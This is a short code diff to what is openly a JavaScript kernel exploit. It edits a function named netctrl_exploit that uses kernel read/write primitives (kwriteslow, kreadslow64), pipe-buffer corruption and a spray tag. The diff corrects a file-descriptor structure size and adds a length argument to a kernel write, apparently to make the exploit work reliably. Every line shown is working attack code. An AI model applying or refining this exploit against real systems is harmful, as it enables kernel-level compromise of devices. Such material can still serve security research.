@@ -144,7 +144,7 @@ IOV_SIZE = 0x10;
 CPU_SET_SIZE = 0x10;
 PIPEBUF_SIZE = 0x18;
 MSG_HDR_SIZE = 0x30;
-FILEDESCENT_SIZE = 0x30;
+FILEDESCENT_SIZE = 0x8;
 UCRED_SIZE = 0x168;
 
 RTHDR_TAG = 0x13370000;
@@ -923,7 +923,7 @@ function netctrl_exploit() {
     write32(masterPipebuf.add(0x08), 0);                // out
     write32(masterPipebuf.add(0x0C), PAGE_SIZE);        // size
     write64(masterPipebuf.add(0x10), victimRpipeData);  // buffer
-    kwriteslow(masterRpipeData, masterPipebuf);
+    kwriteslow(masterRpipeData, masterPipebuf, PIPEBUF_SIZE);
 
     const read_check = kreadslow64(masterRpipeData);
 
